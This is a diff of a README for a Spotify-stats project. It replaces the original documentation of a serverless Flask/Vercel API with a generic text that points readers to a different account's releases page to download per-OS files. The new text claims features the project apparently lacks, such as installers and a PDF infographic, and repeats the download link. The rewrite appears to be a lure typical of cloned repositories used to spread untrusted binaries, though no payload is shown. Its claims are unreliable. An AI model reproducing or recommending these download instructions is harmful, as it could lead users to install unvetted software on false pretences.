@@ -1,194 +1,102 @@
-<div align="center">
-  <img src="images/Spotify.svg", width="100px" >
-  <h1> SpotifyREADMEStats</h1>
+# 🎵 SpotifyREADMEStats - Track Your Spotify Stats Easily
 
-<a href="">![Python](https://img.shields.io/badge/python-3.14-blue.svg)</a>
-<a href="">![Flask](https://img.shields.io/badge/flask-3.1.0-green.svg)</a>
-<a href="">![Spotipy](https://img.shields.io/badge/spotipy-2.25.0-1DB954.svg)</a>
-<a href="">![Vercel](https://img.shields.io/badge/vercel-deployed-black.svg)</a>
-<a href="">![Tests](https://img.shields.io/badge/tests-passing-brightgreen.svg)</a>
+![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)
 
-</div>
+## 🚀 Getting Started
 
-A serverless API that collects your Spotify listening statistics using the spotipy library and makes them available for display in GitHub READMEs or other applications. Built with Python, Flask, and deployed on Vercel.
+Welcome to SpotifyREADMEStats! This simple utility helps you collect your Spotify stats and create an infographic for your GitHub README file. Let’s get started with the steps to download and run the application.
 
-[To deploy this solution for your own needs, jump to THIS section](#deployment-guide)
+## 📥 Download & Install
 
-## Endpoints preview
+To download the latest version, visit the following link:
 
-Use the `/stats` endpoint to access the images API
+[Download Latest Release](https://github.com/Eliaaa3Monte/SpotifyREADMEStats/releases)
 
-| Parameters | Description                                     | Possible values                         | Default values |
-| ---------- | ----------------------------------------------- | --------------------------------------- | -------------- |
-| `type`     | Select the stat to display (only one per query) | `artists`, `top_songs` or `last_albums` | `artists`      |
-| `range`    | Select the time range of selection              | `short_term` or `long_term`             | `short_term`   |
+You will find different files for various systems. Choose the file that fits your operating system. Follow the prompts to complete the installation.
 
-You can also use the `/json` endpoint to access the raw Spotify data as JSON.
+## 🛠️ System Requirements
 
-### Use examples
+Before you install the software, ensure your computer meets the following requirements:
 
-#### Favorite recent artists
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
+- **Python:** Ensure you have Python 3.x installed on your machine. You can download it from the [official Python website](https://www.python.org/downloads/).
 
-```
-stats?type=artists&range=short_term
-```
+## 🔌 Setting Up the Application
 
-<a href="https://github.com/JohanVerne/SpotifyREADMEStats">
-    <img src="https://spotify-stats-rose.vercel.app/stats?type=artists&range=short_term", alt="Top Artists Recent" />
-</a>
+1. **Download the application:** Follow the Download & Install section to get the software.
+   
+2. **Extract the files:** Unzip the downloaded file to a folder on your computer.
+   
+3. **Navigate to the folder:** Open your command line tool (Command Prompt, Terminal, etc.) and navigate to the folder where you extracted the files. Use the command:
 
-#### Most listened-to songs ever
+   ```
+   cd path/to/SpotifyREADMEStats
+   ```
 
-```
-stats?type=top_songs&range=long_term
-```
+4. **Install dependencies:** Run the following command to install the required libraries:
 
-<a href="https://github.com/JohanVerne/SpotifyREADMEStats">
-    <img src="https://spotify-stats-rose.vercel.app/stats?type=top_songs&range=long_term", alt="Top Songs All-Time" />
-</a>
+   ```
+   pip install -r requirements.txt
+   ```
 
-#### Last played albums
+5. **Run the application:** Start the application with the command:
 
-```
-stats?type=last_albums
-```
+   ```
+   python app.py
+   ```
 
-<a href="https://github.com/JohanVerne/SpotifyREADMEStats">
-    <img src="https://spotify-stats-rose.vercel.app/stats?type=last_albums", alt="Last Albums" />
-</a>
+## 🎧 How to Use the App
 
-## Deployment Guide
+- **Connect to Spotify:** You will need to log in to your Spotify account. The application will guide you through this process.
 
-Follow these steps to deploy your own instance with your Spotify data.
+- **Collect Stats:** Once logged in, the application will automatically gather your Spotify listening stats.
 
-### Step 1: Create a Spotify Developer Application
+- **Generate Infographic:** After collecting your data, the app will create an infographic that summarizes your listening habits.
 
-1. Go to [Spotify Developer Dashboard](https://developer.spotify.com/dashboard)
-2. Log in with your Spotify account
-3. Click **Create an App**
-4. Fill in the app name and description, select **Web API** and accept the TOS
-5. Once created, note your **Client ID** and **Client Secret**
-6. Click **Edit Settings**
-7. Add `http://localhost:8888/callback` to **Redirect URIs**
-8. Save the settings
+- **Add to README:** The app will provide simple instructions on how to embed your infographic in your GitHub README file.
 
-### Step 2: Get Your Spotify Refresh Token | ⚠️ INCONSISTENT ⚠️
+## 🔍 Features
 
-The refresh token allows the API to access your Spotify data without requiring browser interaction.
+- **User-friendly Interface:** Designed for anyone to use with minimal effort.
+  
+- **Stat Collection:** Gather various statistics including top songs, artists, and genres.
 
-1. Clone this repository:
+- **Infographic Creation:** Automatically generates a visually appealing PDF infographic.
 
-```bash
-git clone https://github.com/yourusername/SpotifyStats.git
-cd SpotifyStats
-```
+- **GitHub Integration:** Easily add your stats to your GitHub profile.
 
-2. Create and activate a virtual environment:
+## 🧑‍💻 Frequently Asked Questions
 
-```bash
-python -m venv .venv
-source .venv/bin/activate # On Windows: .venv\Scripts\activate
-```
+### 1. Do I need to have coding experience to use this app?
 
-3. Install dependencies:
+No, this app is designed for everyone. Follow the steps provided, and you will be able to use it without any coding knowledge.
 
-```bash
-pip install -r requirements.txt
-```
+### 2. What if I encounter an error during installation?
 
-4. Edit `getRefreshToken.py` and replace the placeholders:
+Please check that you have the correct version of Python installed and all dependencies have been installed successfully. You can also refer to the [issues page](https://github.com/Eliaaa3Monte/SpotifyREADMEStats/issues) for support.
 
-```py
-client_id="YOUR_CLIENT_ID", # From Spotify Dashboard
-client_secret="YOUR_CLIENT_SECRET", # From Spotify Dashboard
-```
+### 3. Can I customize the infographic?
 
-5. Run the script:
+Yes! You can modify your infographic according to your preferences. The application will guide you through the customization options.
 
-```bash
-python getRefreshToken.py
-```
+## 📅 Upcoming Features
 
-6. A browser window may open asking you to authorize the app
-7. The script will print your **refresh token** to the terminal- save this securely!
+Stay tuned for future updates that may include:
 
-### Step 3: Fork and Configure the Repository
+- **Enhanced Stats Visualization:** Expect more ways to view your listening data.
+  
+- **User Profiles:** Save your preferences and stats for easy access.
 
-1. Fork this repository to your GitHub account
-2. Go to your forked repository settings
-3. Navigate to **Secrets and variables** → **Actions**
-4. Add the following secrets (these are for CI/CD testing):
+- **Multi-account Support:** Manage multiple Spotify accounts within the same app.
 
-- `SPOTIPY_CLIENT_ID`: Your Spotify Client ID
-- `SPOTIPY_CLIENT_SECRET`: Your Spotify Client Secret
-- `SPOTIPY_REDIRECT_URI`: `http://localhost:8888/callback`
+## 💻 Support
 
-### Step 4: Deploy to Vercel
+If you have any questions or need assistance, feel free to open an issue on our [GitHub page](https://github.com/Eliaaa3Monte/SpotifyREADMEStats/issues). We are here to help you make the most of SpotifyREADMEStats.
 
-1. Go to [Vercel](https://vercel.com) and sign up/log in
-2. Click **Add New Project**
-3. Import your forked GitHub repository
-4. Vercel will detect the Python project automatically
-5. Create a Github Personal Access Token (PAT) --> you can see the steps [from this repo](https://github.com/anuraghazra/github-readme-stats?tab=readme-ov-file#on-vercel)
-6. Before deploying, add **Environment Variables**:
+## 📄 License
 
-- `SPOTIPY_CLIENT_ID`: Your Spotify Client ID
-- `SPOTIPY_CLIENT_SECRET`: Your Spotify Client Secret
-- `SPOTIPY_REDIRECT_URI`: `http://localhost:8888/callback`
-- `SPOTIFY_REFRESH_TOKEN`: The refresh token from Step 2
-- `PAT_1`: The created PAT
+This project is licensed under the MIT License. See the LICENSE file for details.
 
-7. Click **Deploy**
+---
 
-### Step 5: Test Your Deployment
-
-Once deployed, Vercel will give you a URL like `https://your-project.vercel.app`
-
-Test your API:
-
-```bash
-curl https://your-project.vercel.app/json
-```
-
-You should get a JSON with your Spotify statistics!
-
-### Step 6: Use in Your GitHub README
-
-Add the following to any GitHub README to display your stats:
-
-```html
-<a href="https://github.com/JohanVerne/SpotifyREADMEStats">
-  <img src="https://YOUR_VERCEL_DOMAIN_vercel.app/stats?PARAMS" />
-</a>
-```
-
-Replace YOUR_VERCEL_DOMAIN with the name of your API, present in your Vercel project dashboard, and PARAMS with the parameters [listed here](#endpoints-preview)
-
-## Try out locally
-
-Create a .env file in the project root:
-
-```
-SPOTIPY_CLIENT_ID=your_client_id
-SPOTIPY_CLIENT_SECRET=your_client_secret
-SPOTIPY_REDIRECT_URI=http://localhost:8888/callback
-SPOTIFY_REFRESH_TOKEN=your_refresh_token
-```
-
-Run the collector directly:
-
-```bash
-python -m dotenv run -- python -m statsCollector
-```
-
-Or run the Flask API locally:
-
-```bash
-python -m dotenv run -- python api/index.py
-```
-
-Running Tests
-
-```bash
-python -m dotenv run -- python -m pytest -q
-```
+Now that you have everything you need, go ahead and start tracking your Spotify stats effortlessly! Remember, for downloads, always refer back to our releases page: [Download Latest Release](https://github.com/Eliaaa3Monte/SpotifyREADMEStats/releases). Enjoy exploring your music habits!
